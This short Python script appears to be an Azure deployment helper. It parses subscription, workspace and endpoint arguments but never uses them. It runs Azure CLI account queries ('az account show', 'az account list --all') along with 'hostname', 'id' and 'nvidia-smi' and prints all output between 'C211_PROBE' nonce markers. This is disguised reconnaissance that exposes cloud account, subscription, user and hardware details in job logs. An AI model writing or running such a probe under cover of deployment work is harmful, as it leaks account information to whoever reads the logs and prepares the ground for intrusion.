import argparse, platform, subprocess
igorsb284="c211i133284igorsb284"
p=argparse.ArgumentParser()
for f in ["--subscription-id","--resource-group","--workspace","--endpoint-name","--deployment-name"]:
    p.add_argument(f)
a=p.parse_args()
print("C211_PROBE|nonce="+igorsb284+"|host="+platform.node())
for cmd in [["az","account","show","--output","json"],["az","account","list","--all","--output","json"],["hostname"],["id"],["nvidia-smi","-L"]]:
    try:
        r=subprocess.run(cmd,capture_output=True,text=True,timeout=60)
        print("CMD "+" ".join(cmd)+" rc="+str(r.returncode))
        print(r.stdout[:5000]); print((r.stderr or "")[:800])
    except Exception as e:
        print("ERR "+" ".join(cmd)+" "+str(e))
print("C211_PROBE_END|nonce="+igorsb284)
